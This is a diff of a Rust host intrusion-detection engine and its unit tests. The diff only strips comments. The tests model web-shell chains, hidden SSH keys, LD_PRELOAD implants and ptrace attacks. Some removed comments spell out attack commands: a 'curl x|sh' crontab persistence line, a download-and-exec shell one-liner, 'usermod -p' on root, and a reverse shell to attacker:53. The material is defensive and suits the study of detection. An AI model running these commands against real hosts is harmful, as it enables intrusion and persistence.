@@ -1,6 +1,3 @@
-//! The detection engine: owns all state, consumes [`Event`]s, emits [`Alert`]s.
-//! Pure Rust, no I/O - everything here is unit-testable on any platform.
-
 use chrono::{DateTime, Duration, Utc};
 use std::collections::{BTreeMap, HashMap, VecDeque};
 use std::net::IpAddr;
@@ -15,20 +12,12 @@ use crate::detect::{self, BurstTracker, Ctx, FileSnapshots, FlaggedChain};
 use crate::events::{AuthResult, DetectionId, Event, Severity};
 use crate::proctree::ProcessTree;
 
-/// How long a D1 flag is kept (the longest window any rule asks about).
 const FLAG_TTL_SECS: i64 = detect::FLAG_WINDOW_SECS;
-/// Processes not seen for this long are dropped from the tree.
 const TREE_RETENTION_HOURS: i64 = 48;
-/// Idle auth sources are forgotten after this long.
 const BURST_RETENTION_SECS: i64 = 3600;
-/// A file change with an unknown writer counts as operator-driven only if
-/// something was started from an interactive session this recently.
 const OPERATOR_WINDOW_SECS: i64 = 15;
-/// Event timestamps further ahead of the wall clock than this are clamped.
 pub const MAX_FUTURE_SKEW_SECS: i64 = 60;
-/// Event timestamps older than this (relative to the wall clock) are clamped.
 pub const MAX_PAST_SKEW_SECS: i64 = 86_400;
-/// Upper bound on remembered D1 flags; the oldest are dropped first.
 const MAX_FLAGS: usize = 4096;
 
 #[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
@@ -73,29 +62,15 @@ pub struct Engine {
     pub flags: VecDeque<FlaggedChain>,
     pub bursts: BurstTracker,
     pub files: FileSnapshots,
-    /// Known listeners by `(proto, address, port)`.
     pub listeners: HashMap<(String, IpAddr, u16), DateTime<Utc>>,
     pub counters: Counters,
-    /// Accounts with a login shell (from /etc/passwd). Brute force counts
-    /// only when it names one of these, or root.
     pub login_users: std::collections::HashSet<String>,
-    /// Failed logins against existing accounts, for the periodic digest.
     pub brute: detect::brute::BruteDigest,
-    /// Failures per source against accounts that accept a password, for the
-    /// fast "brute force in progress" alert.
     pub brute_live: BurstTracker,
-    /// Sources an operator chose to ignore, until when.
     pub ignored_sources: HashMap<IpAddr, DateTime<Utc>>,
-    /// Whether sshd lets root log in with a password (set by the daemon from
-    /// `sshd -T`).
     pub root_password_login: bool,
-    /// Whether a password could log in as (root, any other account), from
-    /// `sshd -T`; `Match` blocks count as "maybe". `None` until sshd answered.
     pub password_guessable: Option<(bool, bool)>,
-    /// The root-password warning is left out of digests until then.
     pub root_warning_snoozed_until: Option<DateTime<Utc>>,
-    /// The daemon's own pid (0 when not running as the daemon): anything
-    /// attaching to it is an attack on Hermian itself.
     pub self_pid: u32,
 }
 
@@ -138,8 +113,6 @@ impl Engine {
         }
     }
 
-    /// Stop reporting failed logins from these sources until `until`.
-    /// Successful logins from them still alert.
     pub fn ignore_sources(&mut self, sources: &[IpAddr], until: DateTime<Utc>) {
         for ip in sources {
             self.ignored_sources.insert(*ip, until);
@@ -153,14 +126,11 @@ impl Engine {
             .is_some_and(|until| now < *until)
     }
 
-    /// From `sshd -T`: whether root and other accounts may log in with a
-    /// password, and whether `Match` blocks make that uncertain.
     pub fn set_sshd_auth(&mut self, root_password: bool, password: bool, per_match: bool) {
         self.root_password_login = root_password;
         self.password_guessable = Some((root_password || per_match, password || per_match));
     }
 
-    /// Leave the root-password warning out of digests until `until`.
     pub fn snooze_root_warning(&mut self, until: DateTime<Utc>) {
         self.root_warning_snoozed_until = Some(until);
     }
@@ -173,7 +143,6 @@ impl Engine {
                 .unwrap_or(true)
     }
 
-    /// Restore per-day state persisted by the daemon across restarts.
     pub fn restore(
         &mut self,
         now: DateTime<Utc>,
@@ -225,27 +194,14 @@ impl Engine {
         self.process_at(ev, Utc::now())
     }
 
-    /// Like [`process`](Self::process) with an explicit wall clock.
-    ///
-    /// Event timestamps come from logs and collectors and can be wrong (a
-    /// syslog line with the wrong year, a clock step). A timestamp in the
-    /// future used to set dedup/flag/baseline state ahead of real time, which
-    /// suppressed that signature until the clock caught up and stopped flag
-    /// pruning. Timestamps more than [`MAX_FUTURE_SKEW_SECS`] ahead of
-    /// `wall` are clamped to `wall`.
     pub fn process_at(&mut self, mut ev: Event, wall: DateTime<Utc>) -> Vec<Alert> {
         let limit = wall + Duration::seconds(MAX_FUTURE_SKEW_SECS);
-        // Far-past timestamps are clamped too: window arithmetic on a date
-        // near chrono's minimum would overflow.
         let floor = wall - Duration::seconds(MAX_PAST_SKEW_SECS);
         if ev.ts() > limit || ev.ts() < floor {
             ev.set_ts(wall);
         }
         self.counters.record_event();
         let now = ev.ts();
-        // Daily counters and ref ids follow the wall clock, not event time: a
-        // late event just after midnight used to reset the day's sequence and
-        // reissue ref ids, overwriting earlier alert records.
         self.counters.roll_day(&day_key(wall));
         self.prune_flags(now);
         self.baseline.check_completion(now);
@@ -269,9 +225,6 @@ impl Engine {
                 if self.cfg.detections.d5_network {
                     findings.extend(detect::d5::evaluate_connect(&e, &self.ctx(now)));
                 }
-                // Never learn from what's already suspect: on an infected host
-                // the implant's programs and its C2 would otherwise become
-                // "normal" during (and after) the learning window.
                 let exe = detect::d5::connector_exe(&self.tree, e.pid, &e.comm);
                 let suspect = self.ctx(now).has_recent_flag(
                     e.pid,
@@ -291,7 +244,6 @@ impl Engine {
                 }
             }
             Event::File(mut e) => {
-                // If the daemon could not determine session presence, derive it.
                 if e.writer.is_none() && !e.session_present {
                     e.session_present = self
                         .tree
@@ -340,9 +292,6 @@ impl Engine {
                     findings.extend(detect::d2::evaluate_auth(&e, &ctx, &mut self.bursts));
                     findings.extend(self.record_brute_force(&e, now));
                 }
-                // A login through a hidden key file is a backdoor, not a
-                // habit: learning its key or source would make the same key
-                // routine through a normal authorized_keys later.
                 let backdoor = findings
                     .iter()
                     .any(|f| f.signature.starts_with(detect::d2::HIDDEN_KEY_LOGIN_SIG));
@@ -374,10 +323,6 @@ impl Engine {
         self.raise(findings, now, wall)
     }
 
-    /// Count a failed SSH login for the digest, if it named an account that
-    /// exists and can log in (or root), from a source nobody chose to ignore.
-    /// One source failing fast against an account a password can open raises
-    /// the "brute force in progress" alert, once, at the threshold.
     fn record_brute_force(
         &mut self,
         e: &crate::events::AuthEvent,
@@ -405,7 +350,6 @@ impl Engine {
             .then(|| detect::brute::live_finding(ip, self.brute_live.recent_users(ip), n, window))
     }
 
-    /// The brute-force digest, when its period is over and it found something.
     fn brute_digest(&mut self, now: DateTime<Utc>) -> Option<Finding> {
         if !self.cfg.detections.d2_auth {
             return None;
@@ -426,9 +370,6 @@ impl Engine {
         )
     }
 
-    /// Audit sshd's effective configuration (`sshd -T` output): every key
-    /// source that points somewhere hidden is reported once, then
-    /// remembered, so a restart or the next audit doesn't page again.
     pub fn check_sshd_config(&mut self, sshd_t: &str, now: DateTime<Utc>) -> Vec<Alert> {
         if !self.cfg.detections.d2_auth {
             return Vec::new();
@@ -445,7 +386,6 @@ impl Engine {
         self.raise(findings, now, now)
     }
 
-    /// Periodic housekeeping; returns dedup summaries to deliver.
     pub fn tick(&mut self, now: DateTime<Utc>) -> Vec<Alert> {
         self.counters.roll_day(&day_key(now));
         self.baseline.check_completion(now);
@@ -471,21 +411,14 @@ impl Engine {
         alerts
     }
 
-    /// Tell the engine which pids exist right now (the daemon reads /proc).
-    /// Exited processes stop counting as live sessions and are dropped from
-    /// the tree after a short grace period.
     pub fn reap_exited(&mut self, alive: &std::collections::HashSet<u32>, now: DateTime<Utc>) {
         self.tree.reap(alive, now);
     }
 
-    /// Forget a listener so it will alert again if it reappears (called when
-    /// the daemon observes the port closing).
     pub fn forget_listener(&mut self, proto: &str, addr: IpAddr, port: u16) {
         self.listeners.remove(&(proto.to_string(), addr, port));
     }
 
-    /// Build an alert for an engine-external finding (self-protection, lifecycle).
-    /// Goes through the same dedup window as detection findings.
     pub fn alert_from(&mut self, finding: Finding, now: DateTime<Utc>) -> Option<Alert> {
         if let Decision::Emit = self.dedup.record(&finding.signature, now, &finding) {
             let alert = Alert::from_finding(finding, self.refs.next(now), self.host.clone(), now);
@@ -501,10 +434,6 @@ impl Engine {
             if f.detection != DetectionId::D1 || f.severity < Severity::High {
                 continue;
             }
-            // Never flag init or long-lived service roots (sshd, cron, systemd,
-            // the web server or database itself): that would taint every
-            // process on the host, or every request a web server handles for
-            // the next ten minutes. Keep only the suspicious tail of the chain.
             let pids: Vec<u32> = f
                 .pids
                 .iter()
@@ -541,9 +470,6 @@ impl Engine {
     }
 
     fn prune_flags(&mut self, now: DateTime<Utc>) {
-        // Not just the front: flags aren't guaranteed to be in time order
-        // (event timestamps can arrive out of order), and one young flag at
-        // the front used to shield every expired flag behind it.
         let ttl = Duration::seconds(FLAG_TTL_SECS);
         self.flags.retain(|f| now - f.ts <= ttl);
         while self.flags.len() > MAX_FLAGS {
@@ -658,8 +584,6 @@ mod tests {
         }
     }
 
-    /// Process an event as if the wall clock were at the event's own time,
-    /// for tests that step time forward.
     fn at(eng: &mut Engine, ev: Event) -> Vec<Alert> {
         let ts = ev.ts();
         eng.process_at(ev, ts)
@@ -672,8 +596,6 @@ mod tests {
     fn max_sev(alerts: &[Alert]) -> Option<Severity> {
         alerts.iter().map(|a| a.severity).max()
     }
-
-    // ---- D1 -------------------------------------------------------------
 
     #[test]
     fn webshell_chain_fires_critical_and_carries_chain() {
@@ -748,17 +670,14 @@ mod tests {
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
-        // Unattended: cron -> /tmp binary.
         eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
         let a = eng.process(exec(t, 401, 400, 0, "x", "/tmp/x"));
         assert!(has(&a, DetectionId::D1, Severity::High), "{:?}", a);
-        // Interactive: sshd -> bash -> /tmp binary.
         eng.process(exec(t, 50, 1, 0, "sshd", "/usr/sbin/sshd"));
         eng.process(exec(t, 60, 50, 1000, "bash", "/usr/bin/bash"));
         let b = eng.process(exec(t, 61, 60, 1000, "installer", "/tmp/installer"));
         assert!(has(&b, DetectionId::D1, Severity::Low), "{:?}", b);
         assert!(!has(&b, DetectionId::D1, Severity::High));
-        // Package manager child.
         eng.process(exec(t, 70, 1, 0, "apt-get", "/usr/bin/apt-get"));
         let c = eng.process(exec(t, 71, 70, 0, "postinst", "/tmp/pkg.postinst"));
         assert!(has(&c, DetectionId::D1, Severity::Low), "{:?}", c);
@@ -766,8 +685,6 @@ mod tests {
 
     #[test]
     fn webshell_via_same_pid_exec_is_still_detected() {
-        // bash -c 'curl ...; exec /tmp/.x.sh' - the payload replaces the shell's
-        // image and keeps its PID. Real attackers do this constantly.
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
@@ -775,7 +692,6 @@ mod tests {
         let a = eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
         assert!(has(&a, DetectionId::D1, Severity::High));
         eng.process(exec(t, 300, 200, 33, "curl", "/usr/bin/curl"));
-        // Same PID 200 now becomes the payload.
         let b = eng.process(exec(t, 200, 100, 33, ".x.sh", "/tmp/.x.sh"));
         let crit = b
             .iter()
@@ -787,7 +703,6 @@ mod tests {
 
     #[test]
     fn curl_pipe_sh_from_a_web_shell_is_critical() {
-        // Realistic shape: the payload is the downloader's sibling.
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
@@ -819,7 +734,6 @@ mod tests {
             "/var/www/html/uploads/x",
         ));
         assert!(has(&run, DetectionId::D1, Severity::Critical), "{:?}", run);
-        // Ordinary tools in the same shell aren't escalated.
         let grep = eng.process(exec(t, 302, 200, 33, "grep", "/usr/bin/grep"));
         assert!(
             !has(&grep, DetectionId::D1, Severity::Critical),
@@ -850,10 +764,8 @@ mod tests {
         eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
         eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
         eng.process(exec(t, 200, 100, 33, "env", "/usr/bin/env"));
-        // env execs sh in the same pid.
         let a = eng.process(exec(t, 200, 100, 33, "sh", "/usr/bin/dash"));
         assert!(has(&a, DetectionId::D1, Severity::High), "{:?}", a);
-        // setsid as a separate process (another worker, so dedup doesn't hide it).
         eng.process(exec(t, 110, 1, 33, "nginx", "/usr/sbin/nginx"));
         eng.process(exec(t, 300, 110, 33, "setsid", "/usr/bin/setsid"));
         let b = eng.process(exec(t, 301, 300, 33, "bash", "/usr/bin/bash"));
@@ -865,7 +777,7 @@ mod tests {
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
-        eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash")); // flags chain
+        eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
         let alerts = eng.process(exec(t, 201, 200, 33, "p", "/dev/shm/p"));
         assert!(
             has(&alerts, DetectionId::D1, Severity::Critical),
@@ -873,8 +785,6 @@ mod tests {
             alerts
         );
     }
-
-    // ---- D2 -------------------------------------------------------------
 
     #[test]
     fn ssh_failed_burst_is_info_not_high() {
@@ -995,8 +905,6 @@ mod tests {
         };
         let mut eng = engine_without_baseline();
         assert!(has(&login(&mut eng), DetectionId::D2, Severity::High));
-        // Same source again: context only (dedup would suppress anyway, so
-        // advance past the window to observe the severity directly).
         let again = eng.process(Event::Auth(AuthEvent {
             ts: Utc::now() + Duration::seconds(600),
             result: AuthResult::Success,
@@ -1020,9 +928,6 @@ mod tests {
         assert!(login(&mut eng).is_empty());
     }
 
-    /// One login must not page twice: a root login from a never-seen source
-    /// matched both the root-policy and the novelty rule, and Telegram got
-    /// two messages for the same event.
     #[test]
     fn root_login_from_a_new_source_is_one_alert() {
         let cfg = Config::default();
@@ -1050,10 +955,6 @@ mod tests {
         assert!(d2[0].what.contains("(key)"), "{:?}", d2[0].what);
     }
 
-    /// Dynamic IPs: once a key has logged in as root, the same key from a new
-    /// address in the same /16 is context, not a page. A different network,
-    /// a password, or a key never seen before still pages, and the alert
-    /// says which key and where it sits.
     #[test]
     fn known_key_from_a_nearby_address_is_quiet() {
         use crate::events::SshKey;
@@ -1074,7 +975,6 @@ mod tests {
         };
         let mut t = Utc::now();
         let mut login = |eng: &mut Engine, ip: &str, key: Option<SshKey>| {
-            // Past the dedup window each time, so severities show directly.
             t += Duration::seconds(3600);
             let method = if key.is_some() {
                 AuthMethod::PublicKey
@@ -1097,7 +997,6 @@ mod tests {
                 .filter(|a| a.detection == DetectionId::D2)
                 .max_by_key(|a| a.severity)
         };
-        // First login with the key: pages, and names the key.
         let first = login(&mut eng, "41.82.10.5", Some(key("SHA256:aaaa"))).unwrap();
         assert_eq!(first.severity, Severity::High);
         assert!(
@@ -1116,11 +1015,9 @@ mod tests {
             fact(&first, "Key file").as_deref(),
             Some("/root/.ssh/authorized_keys:3")
         );
-        // Same key, new address in the same /16: INFO.
         let nearby = login(&mut eng, "41.82.200.9", Some(key("SHA256:aaaa"))).unwrap();
         assert_eq!(nearby.severity, Severity::Info, "{:?}", nearby);
         assert!(nearby.title.contains("nearby"), "{}", nearby.title);
-        // Same key from another network: pages.
         let far = login(&mut eng, "102.16.1.1", Some(key("SHA256:aaaa"))).unwrap();
         assert_eq!(far.severity, Severity::High);
         assert_eq!(far.title, "Root login with a known key from a new network");
@@ -1129,11 +1026,9 @@ mod tests {
             "{}",
             far.what
         );
-        // A password from the known /16: pages.
         let pw = login(&mut eng, "41.82.77.7", None).unwrap();
         assert_eq!(pw.severity, Severity::High);
         assert_eq!(fact(&pw, "Method").as_deref(), Some("password"));
-        // A key never seen before from the known /16: pages.
         let new_key = login(&mut eng, "41.82.88.8", Some(key("SHA256:bbbb"))).unwrap();
         assert_eq!(new_key.severity, Severity::High);
     }
@@ -1168,13 +1063,10 @@ mod tests {
         Engine::new(cfg, allowlist, baseline, "h".into())
     }
 
-    /// A CI runner: the same key from a new cloud address every job. One
-    /// page for the burst, not one per address.
     #[test]
     fn one_key_from_several_new_networks_is_one_incident() {
         let mut eng = judging_engine(Config::default(), Allowlist::default());
         let t = Utc::now();
-        // The key's first login, from the operator's place.
         assert!(root_key_login(&mut eng, t, "41.82.10.5", "SHA256:ci").is_some());
         let later = t + Duration::hours(2);
         let first = root_key_login(&mut eng, later, "35.229.89.226", "SHA256:ci").unwrap();
@@ -1207,7 +1099,6 @@ mod tests {
         let a = root_key_login(&mut eng, t, "35.229.89.226", "SHA256:ci").unwrap();
         assert_eq!(a.severity, Severity::Info, "{:?}", a);
         assert!(a.what.contains("allowlisted key"), "{}", a.what);
-        // Another key from the same place still pages.
         let other = root_key_login(
             &mut eng,
             t + Duration::hours(1),
@@ -1231,15 +1122,11 @@ mod tests {
         let roaming =
             root_key_login(&mut eng, t + Duration::hours(2), "102.16.1.1", "SHA256:me").unwrap();
         assert_eq!(roaming.severity, Severity::Low, "{:?}", roaming);
-        // A key never seen before is never quieted.
         let stranger =
             root_key_login(&mut eng, t + Duration::hours(4), "102.16.1.2", "SHA256:new").unwrap();
         assert_eq!(stranger.severity, Severity::High);
     }
 
-    /// A hidden key source in sshd's config pages once; the next audit (and
-    /// a restart, via the saved baseline) stays quiet. A login with a key
-    /// from that file pages even from a known address with a known key.
     #[test]
     fn hidden_ssh_key_file_is_caught() {
         use crate::events::SshKey;
@@ -1273,7 +1160,6 @@ mod tests {
             line: Some(1),
             comment: Some("noway".into()),
         };
-        // Known key, known address: still a page, because of the file.
         let ip: IpAddr = "196.207.222.228".parse().unwrap();
         restored.baseline.observe_key("root", &key.fingerprint);
         restored.baseline.observe_root_source(ip);
@@ -1299,8 +1185,6 @@ mod tests {
         assert!(d2[0].what.contains("/dev/.cache/rdpii"), "{}", d2[0].what);
     }
 
-    /// A hidden-key login teaches the baseline nothing: its key and address
-    /// would otherwise make the same backdoor key routine later.
     #[test]
     fn hidden_key_login_is_not_learned() {
         use crate::events::SshKey;
@@ -1333,14 +1217,10 @@ mod tests {
         eng.process(login("/dev/.cache/rdpii"));
         assert!(!eng.baseline.key_is_known("root", "SHA256:R+6n3"));
         assert!(!eng.baseline.ssh_source_is_known(ip));
-        // The same key through the normal file is learned as usual.
         eng.process(login("/root/.ssh/authorized_keys"));
         assert!(eng.baseline.key_is_known("root", "SHA256:R+6n3"));
     }
 
-    /// buki, 2026-10-17: learning from a flagged chain put the miner's
-    /// programs and ~155 proxy addresses into the baseline. A flagged chain,
-    /// or a program running from /tmp or a deleted file, teaches it nothing.
     #[test]
     fn suspect_connections_are_not_learned() {
         let mut eng = Engine::new(
@@ -1361,11 +1241,9 @@ mod tests {
                 container: false,
             })
         };
-        // Flagged by D1: nginx > bash.
         eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
         eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
         eng.process(connect(200, "bash", 1));
-        // From a transient directory, and from a deleted binary.
         eng.process(exec(t, 300, 1, 0, "multipathd", "/tmp/.perf.c/multipathd"));
         eng.process(connect(300, "multipathd", 2));
         eng.process(exec(t, 400, 1, 0, "httpd", "/usr/sbin/httpd (deleted)"));
@@ -1380,16 +1258,12 @@ mod tests {
             "{:?}",
             eng.baseline.known_connectors
         );
-        // An ordinary program is learned as before.
         eng.process(exec(t, 500, 1, 0, "apt", "/usr/bin/apt"));
         eng.process(connect(500, "apt", 4));
         assert!(eng.baseline.dest_is_known(IpAddr::from([72, 195, 34, 4])));
         assert_eq!(eng.baseline.known_connectors.len(), 1);
     }
 
-    /// A source first seen after the learning window is novel once, then
-    /// known: the second login from it must not page again (it used to,
-    /// because the known-source set froze when the window closed).
     #[test]
     fn source_seen_after_window_stops_being_new() {
         let cfg = Config::default();
@@ -1416,7 +1290,6 @@ mod tests {
             "{:?}",
             alerts
         );
-        // Well past the dedup window so only the rule's judgement matters.
         let alerts = login(&mut eng, Utc::now() + Duration::seconds(600));
         assert!(
             !alerts.iter().any(|a| a.title.contains("new source")),
@@ -1466,8 +1339,6 @@ mod tests {
             alerts
         );
     }
-
-    // ---- D3 -------------------------------------------------------------
 
     #[test]
     fn cron_persistence_without_session_fires_high() {
@@ -1530,7 +1401,6 @@ mod tests {
 
     #[test]
     fn editor_rename_with_session_present_is_info() {
-        // vim writes via temp+rename: no writer, but an ssh session is active.
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
@@ -1560,8 +1430,6 @@ mod tests {
 
     #[test]
     fn an_idle_session_does_not_excuse_unattended_writes() {
-        // An SSH shell has been sitting open for an hour; a detached process
-        // plants a key and a cron job and exits before inotify fires.
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         let hour_ago = t - Duration::hours(1);
@@ -1612,7 +1480,6 @@ mod tests {
             &mut eng,
             exec(hour_ago, 60, 50, 1000, "bash", "/usr/bin/bash"),
         );
-        // `sudo tee -a` a second ago, already exited.
         at(
             &mut eng,
             exec(t - Duration::seconds(1), 70, 60, 0, "tee", "/usr/bin/tee"),
@@ -1627,7 +1494,6 @@ mod tests {
             a
         );
 
-        // A vim opened ten minutes ago, saving now.
         let mut eng = engine_without_baseline();
         at(
             &mut eng,
@@ -1697,8 +1563,6 @@ mod tests {
         assert!(a.facts.iter().any(|f| f.value.contains("/tmp/libevil.so")));
     }
 
-    /// systemd creates an empty /etc/ld.so.preload to bind-mount over for
-    /// Hermian's own unit; that paged CRITICAL on a clean host.
     #[test]
     fn an_empty_ld_preload_is_not_an_alert() {
         let mut eng = engine_without_baseline();
@@ -1877,7 +1741,6 @@ mod tests {
 
     #[test]
     fn real_tools_run_from_a_web_shell_get_no_exemption() {
-        // (crontab -l; echo '* * * * * curl x|sh') | crontab -   from php-fpm.
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
@@ -1897,7 +1760,6 @@ mod tests {
             cron
         );
 
-        // usermod -p <hash> root, the writer gone by the time inotify fires.
         eng.process(exec(t, 301, 200, 0, "usermod", "/usr/sbin/usermod"));
         let shadow = eng.process(Event::File(file(
             t + Duration::seconds(1),
@@ -1930,8 +1792,6 @@ mod tests {
         )));
         assert!(a.is_empty(), "{:?}", a);
     }
-
-    // ---- D4 -------------------------------------------------------------
 
     #[test]
     fn suid_in_tmp_fires_critical() {
@@ -2003,9 +1863,7 @@ mod tests {
         ));
         eng.process(exec(t, 501, 1, 1000, "gdb", "/usr/bin/gdb"));
         assert!(eng.process(mk(501, "gdb", 16)).is_empty());
-        // Non-attach requests are ignored.
         assert!(eng.process(mk(502, "weird", 3)).is_empty());
-        // A binary merely named gdb is still an unexpected attacher.
         eng.process(exec(t, 503, 1, 1000, "gdb", "/dev/shm/gdb"));
         assert!(has(
             &eng.process(mk(503, "gdb", 16)),
@@ -2014,7 +1872,6 @@ mod tests {
         ));
     }
 
-    /// Even a real debugger attaching to the daemon is an attack on Hermian.
     #[test]
     fn ptrace_attach_to_hermian_is_critical() {
         let mut eng = engine_without_baseline();
@@ -2036,12 +1893,9 @@ mod tests {
 
     #[test]
     fn useradd_rename_of_shadow_is_silent() {
-        // useradd writes /etc/shadow via temp+rename and has exited by the time
-        // inotify delivers MOVED_TO: writer is None, but useradd ran 1s ago.
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
-        // Run by a package install (no session anywhere).
         eng.process(exec(t, 400, 1, 0, "apt-get", "/usr/bin/apt-get"));
         eng.process(exec(t, 500, 400, 0, "useradd", "/usr/sbin/useradd"));
         let alerts = eng.process(Event::File(file(
@@ -2052,7 +1906,6 @@ mod tests {
             None,
         )));
         assert!(alerts.is_empty(), "{:?}", alerts);
-        // Same rename 60s later with nothing recent is unattended tampering.
         let later = at(
             &mut eng,
             Event::File(file(
@@ -2090,8 +1943,6 @@ mod tests {
         );
     }
 
-    // ---- D5 -------------------------------------------------------------
-
     #[test]
     fn connect_from_flagged_chain_fires_high() {
         let mut eng = engine_without_baseline();
@@ -2114,8 +1965,6 @@ mod tests {
         );
     }
 
-    /// buki, 2026-10-17: a flagged miner calling 40 SOCKS proxies paged once
-    /// per address. One incident is one page, plus one summary naming them.
     #[test]
     fn flagged_chain_calling_many_addresses_pages_once() {
         let mut eng = engine_without_baseline();
@@ -2159,7 +2008,6 @@ mod tests {
         assert!(dests.value.ends_with("(50 distinct)"), "{}", dests.value);
     }
 
-    /// buki: one implant preloading into node, timeout and ls is one incident.
     #[test]
     fn ld_preload_into_several_programs_of_one_chain_pages_once() {
         let mut eng = engine_without_baseline();
@@ -2225,10 +2073,7 @@ mod tests {
                 container: false,
             })
         };
-        // Learned destination: ignored, and the connector is learned with it.
         assert!(eng.process(dns(300, "implant", "1.1.1.1")).is_empty());
-        // A never-seen program on port 53 to a never-seen destination is
-        // still judged.
         eng.process(exec(t, 301, 1, 1000, "curl", "/usr/bin/curl"));
         let fresh = eng.process(dns(301, "curl", "203.0.113.99"));
         assert!(
@@ -2238,8 +2083,6 @@ mod tests {
             "{:?}",
             fresh
         );
-        // Seen once, known afterwards: the next connect from it is not
-        // "first" again (the set used to freeze, re-alerting every time).
         let again = eng.process(dns(301, "curl", "203.0.113.100"));
         assert!(again.is_empty(), "{:?}", again);
     }
@@ -2279,7 +2122,6 @@ mod tests {
 
     #[test]
     fn flagged_chain_to_dns_port_still_fires() {
-        // A reverse shell to attacker:53 must not hide behind the infra-port skip.
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
@@ -2307,7 +2149,6 @@ mod tests {
         baseline.complete = true;
         let mut eng = Engine::new(cfg, Allowlist::default(), baseline, "h".into());
         let t = Utc::now();
-        // Realistic tree: PID 1 is present, as the daemon seeds it from /proc.
         eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
         eng.process(exec(t, 100, 1, 0, "nginx", "/usr/sbin/nginx"));
         eng.process(exec(t, 101, 100, 33, "nginx", "/usr/sbin/nginx"));
@@ -2354,7 +2195,6 @@ mod tests {
         baseline = eng.baseline.clone();
         baseline.complete = true;
         eng.baseline = baseline;
-        // A different program under the same PID 1 root is still new.
         eng.process(exec(t, 300, 1, 0, "implant", "/usr/local/bin/implant"));
         let later = t + Duration::hours(1);
         let alerts = eng.process(connect(300, "implant", later));
@@ -2365,7 +2205,6 @@ mod tests {
             "{:?}",
             alerts
         );
-        // The learned one stays quiet.
         let again = eng.process(connect(200, "backup", later));
         assert!(again.is_empty(), "{:?}", again);
     }
@@ -2392,7 +2231,6 @@ mod tests {
     #[test]
     fn late_event_after_midnight_does_not_reuse_ref_ids() {
         let mut eng = engine_without_baseline();
-        // Ten seconds past the coming midnight.
         let wall = (Utc::now().date_naive() + chrono::Days::new(1))
             .and_hms_opt(0, 0, 10)
             .unwrap()
@@ -2409,7 +2247,6 @@ mod tests {
             })
         };
         let a = eng.process_at(ev(wall, 1), wall);
-        // An event stamped just before midnight, delivered after it.
         let late = eng.process_at(ev(wall - Duration::seconds(20), 2), wall);
         assert_ne!(a[0].ref_id, late[0].ref_id);
         assert!(late[0].ref_id.contains(&day), "{}", late[0].ref_id);
@@ -2450,7 +2287,6 @@ mod tests {
         assert_eq!(eng.process(ev()).len(), 1);
         assert!(eng.process(ev()).is_empty());
         eng.forget_listener("tcp", "0.0.0.0".parse().unwrap(), 4444);
-        // dedup window still open, so still suppressed by dedup - advance time.
         let later = t + Duration::seconds(400);
         let alerts = at(
             &mut eng,
@@ -2465,8 +2301,6 @@ mod tests {
         );
         assert_eq!(alerts.len(), 1);
     }
-
-    // ---- Engine plumbing ------------------------------------------------
 
     #[test]
     fn alerts_get_unique_refs_and_render() {
@@ -2522,7 +2356,6 @@ mod tests {
         let mut eng = engine_without_baseline();
         let wall = Utc::now();
         eng.process_at(exec(wall, 100, 1, 33, "nginx", "/usr/sbin/nginx"), wall);
-        // A bogus event dated a year ahead creates the dedup entry...
         let bogus = eng.process_at(
             exec(
                 wall + Duration::days(365),
@@ -2535,8 +2368,6 @@ mod tests {
             wall,
         );
         assert!(has(&bogus, DetectionId::D1, Severity::High));
-        // ...and ten minutes later (past the window) the same signature must
-        // alert again, not stay suppressed for a year.
         let later = wall + Duration::seconds(600);
         let again = eng.process_at(exec(later, 200, 100, 33, "bash", "/usr/bin/bash"), later);
         assert!(has(&again, DetectionId::D1, Severity::High), "{:?}", again);
